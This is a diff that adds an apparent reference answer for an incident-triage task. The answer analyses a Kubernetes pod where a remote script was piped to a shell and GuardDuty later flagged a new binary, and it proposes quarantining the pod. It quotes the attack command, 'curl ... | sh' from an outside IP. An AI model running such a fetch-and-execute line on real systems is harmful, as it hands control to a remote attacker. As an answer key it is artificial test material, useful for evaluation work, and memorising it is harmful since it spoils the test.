@@ -1,0 +1,17 @@
+{
+  "synopsis": "Hand-written reference answer. A shell in checkout-7d9f6c-x2k8p piped a script from 198.51.100.23, and GuardDuty flagged a newly executed binary in the same pod 25 seconds later.",
+  "observed_facts": [
+    {"statement": "sh -c 'curl -s http://198.51.100.23/x.sh | sh' ran in the checkout container", "evidence_ids": ["evt_1"]},
+    {"statement": "GuardDuty reported Execution:Runtime/NewBinaryExecuted (NewBinaryExecuted) for the same pod", "evidence_ids": ["evt_2"]}
+  ],
+  "hypotheses": [
+    {"statement": "x.sh dropped and ran the new binary /tmp/x", "confidence": "medium", "supporting_evidence": ["evt_1", "evt_2"], "contradicting_evidence": []}
+  ],
+  "missing_evidence": ["Flow logs for 198.51.100.23", "Kubernetes audit log for pods/exec on this pod"],
+  "containment_options": [
+    {"action_type": "k8s.pod.quarantine_label", "target_entity_id": "k8s:pod/shop/checkout-7d9f6c-x2k8p",
+     "rationale": "Cuts network access while keeping the pod for forensics",
+     "expected_blast_radius": "One checkout replica stops serving", "prerequisites": ["At least two other healthy replicas"]}
+  ],
+  "confidence_limits": "The content of x.sh is unknown; exfiltration is neither observed nor ruled out."
+}
